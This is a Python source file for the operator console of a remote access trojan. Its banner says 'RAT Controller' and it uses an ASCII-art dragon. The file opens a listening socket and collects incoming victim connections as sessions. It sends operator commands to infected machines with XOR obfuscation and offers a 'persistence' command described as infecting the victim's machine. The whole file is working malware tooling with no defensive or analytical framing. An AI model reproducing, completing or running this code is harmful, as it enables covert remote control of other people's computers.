import socket, sys, os, interface

if sys.version_info[0] == 2:
	import thread as thread
	get_input = raw_input
elif sys.version_info[0] == 3:
	get_input = input
	import _thread as thread

# TODO check clients died
# TODO remove client died
# TODO traceroute client
# TODO exit command in submodule
# TODO kill client from server

def int_xor(cleartext, key):
	ret = ""
	for char in cleartext:
		ret += chr(ord(char) ^ key) if char != "\n" else char
	return ret


class Server(interface.AutoCompletion):
	def __init__(self, lhost, lport, key):
		super(Server, self).__init__()
		self.sub_menu = ['help', 'back', 'persistence']
		self.main_menu = ['connect ', 'list', 'session ', 'help', 'exit']
		self.current_module = 'Main Menu'
		self.client = []
		self.address = []
		self.current_host = 0
		self.xor_key = key
		self.banner = '''
		            .------.
		           /  ~ ~   \,------.      ______
		         ,'  ~ ~ ~  /  (@)   \   ,'      \\
		       ,'          /`.    ~ ~ \ /         \\
		     ,'           | ,'\  ~ ~ ~ X     \  \  \\
		   ,'  ,'          V--<       (       \  \  \\
		 ,'  ,'               (vv      \/\  \  \  |  |
		(__,'  ,'   /         (vv   ""    \  \  | |  |
		  (__,'    /   /       vv   """    \ |  / / /
		      \__,'   /  |     vv          / / / / /
		          \__/   / |  | \         / /,',','
		             \__/\_^  |  \       /,'',','\\
		                    `-^.__>.____/  ' ,'   \\
		                            // //---'      |
		          ===============(((((((=================
		                                     | \ \  \\
		                                     / |  |  \\
		                                    / /  / \  \\
		                                    `.     |   \\
		                                      `--------' '''
		self.print_banner()
		self.run(lhost, lport)
	# Main Class Functions
	def print_banner(self):
		print(self.banner)
	def sub_cmd_help(self, args):
		return '''
Help:\n
	back\t\tGo back to main menu
	killself\t\tKill agent
	persistence\t\tInfect to victim's machine
		'''
	
	def help_banner(self):
		print('''
		RAT Controller\n
		[*] Usage: {} <lhost> <lport>
		'''.format(sys.argv[0]))
	
	def parse_line(self, cmd):
		cmd, _, arg = cmd.strip().partition(" ")
		return cmd, arg.strip()
	
	def suggested_commands(self):
		if self.current_module == 'Main Menu':
			return self.main_menu
		else:
			return self.sub_menu
	
	def prompt(self):
		return "\033[97m[{}]\033[00m\033[91m > \033[00m".format(self.current_module)
	
	def run(self, lhost, lport):
		try:
			print("[*] Listenning [%s:%s] [key %s]" %(lhost, lport, self.xor_key))
			thread.start_new_thread(self.create_server, (lhost, lport, ))
			self.main_loop_cmd()
		except KeyboardInterrupt:
			print("Interrupted by user")
		except Exception as error:
			print("[x] Error: %s" %(error))
	
	# End Main Class Functions
	
	# Main Menu Functions
	
	def main_cmd_help(self, args):
		return '''
Help:\n
	session   <session number>		Connect to open session
	connect   <ip>   <port>			Connect via IP and Port
	list					List all connected ip
			'''
	
	def main_cmd_list(self, args):
		if not self.address:
			return "No session avaiable"
		else:
			data = "	Session	     Host					Port\n\n"
			session = 1
			for rhost, rport in self.address:
				data += "	   {}  	{}					{}\n".format(session, rhost, rport)
				session += 1
			return data + '\n'
	
	def main_loop_cmd(self):
		while True:
			try:
				command, args = self.parse_line(get_input(self.prompt()))
				if not command:
					pass
				elif command == 'exit':
					print("Exit")
					break
				else:
					try:
						print(getattr(self, 'main_cmd_{}'.format(command))(args))
					except Exception:
						print("Unknow command {}".format(command))
			except KeyboardInterrupt:
				print("")
	
	def main_cmd_session(self, args):
		if not args:
			return "[x] Must provide session id to connect to"
		session = int(args) - 1
		try:
			self.send_command_to_client(self.client[session], self.address[session])
			return "Back to main menu"
		except KeyboardInterrupt:
			self.current_module = 'Main Menu'
			return "Canceled by user"
		except:
			self.current_module = "Main Menu"
			return "Can not call session {}. Check your command.".format(session + 1)
	
	def main_cmd_connect(self, args):
		temp = 0
		print("%s" %(args))
		try:
			rhost, rport = args.split(" ")
		except:
			return "Wrong format"
		for client in self.address:
			if rhost == client[0] and int(rport) == client[1]:
				try:
					self.send_command_to_client(self.client[temp], client)
					return 'Back to main menu'
				except KeyboardInterrupt:
					self.current_module = 'Main Menu'
					return 'Canceled by user'
				except:
					return 'Can not do this'
			else:
				temp += 1
		return "Can not connect to {}".format(args)
	
	def send_command_to_client(self, connect, address):
		self.current_module = address[0]
		print("Connected to {} on port {}".format(*address))
		while True:
			try:
				data = get_input(self.prompt())
				command, args = self.parse_line(data)
				if not command:
					continue
				elif command == 'back':
					break
				elif command == 'exit':
					connect.sendall(int_xor(data, self.xor_key))
					# TODO close connection here
					break
				try:
					print(getattr(self, 'sub_cmd_{}'.format(command))(args))
				except:
					connect.sendall(int_xor(data, self.xor_key))
					print("\n{}\n".format(int_xor(connect.recv(1024), self.xor_key)))
			except socket.error:
				print("Connection Died!")
				break
		self.current_module = 'Main Menu'
	
	def create_server(self, lhost, lport):
		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server.bind((lhost, lport))
		server.listen(1024)
		while True:
			client, address = server.accept()
			self.current_host += 1
			print("\nSession {} opened\n\nIP: {}\nPort: {}\n".format(self.current_host, *address))
			sys.stdout.write("{}".format(self.prompt()))
			sys.stdout.flush()
			self.client.append(client)
			self.address.append(address)
		server.close()
	
	# End Main Menu Functions
	

